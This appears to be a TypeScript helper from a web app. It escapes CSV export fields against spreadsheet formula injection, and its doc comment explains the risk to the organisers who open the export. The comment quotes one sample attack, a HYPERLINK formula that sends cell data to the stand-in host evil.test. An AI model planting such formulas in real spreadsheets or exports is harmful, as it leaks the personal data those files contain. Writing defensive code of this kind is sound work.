/** Characters that make a spreadsheet treat a cell as a formula, not text. */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Escapes one CSV cell, defusing spreadsheet formula injection.
 *
 * Excel, LibreOffice and Sheets evaluate any cell beginning with = + - or @.
 * A buyer who types `=HYPERLINK("https://evil.test?d="&A1,"Click")` as their
 * name gets that formula executed on the organiser's machine when the export is
 * opened — the classic path to exfiltrating the very list the file contains.
 * Names and emails here are attacker-controlled free text, so every field is
 * treated as hostile and prefixed with an apostrophe, which spreadsheets read
 * as "this cell is text".
 *
 * Phone numbers start with `+` and so are prefixed too. That is the right
 * outcome independently: it stops Excel reinterpreting +234... as a formula or
 * mangling it into scientific notation.
 *
 * Lives here rather than in the route because a Next.js route module may only
 * export its handlers — and because the regression suite needs to import it.
 */
export function csvField(value: unknown): string {
  const s = String(value ?? '');
  const neutralised = FORMULA_PREFIXES.some((p) => s.startsWith(p)) ? `'${s}` : s;
  return /[",\n\r]/.test(neutralised) ? `"${neutralised.replace(/"/g, '""')}"` : neutralised;
}
